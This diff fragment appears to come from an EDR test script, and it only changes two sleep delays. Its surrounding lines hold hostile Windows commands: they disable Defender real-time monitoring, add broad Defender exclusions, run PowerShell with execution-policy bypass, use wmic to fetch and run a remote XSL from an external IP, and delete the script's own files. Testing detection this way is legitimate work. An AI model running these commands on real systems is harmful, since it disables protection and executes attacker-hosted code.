@@ -12,9 +12,9 @@ powershell.exe -ExecutionPolicy Bypass -C \"C:\\Windows\\System32\\rundll32.exe 
 cmd  /c powershell Set-MpPreference -DisableRealtimeMonitoring 1;Add-MpPreference -ExclusionPath c:\\;Add-MpPreference -ExclusionProcess c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe;
 #5
 wmic os get /FORMAT:\"http://172.83.155.170:8170/s.xsl;
-Start-Sleep -Seconds 10;
+Start-Sleep -Seconds 15;
 #6
 Remove-Item -Path "C:\Tecnova\2Tecnova-JulioC-TestEDR.ps1" -Force;
-Start-Sleep -Seconds 3;
+Start-Sleep -Seconds 15;
 #7
 Remove-Item -Path "C:\Tecnova\1Tecnova-JulioC-TestEDR.bat" -Force
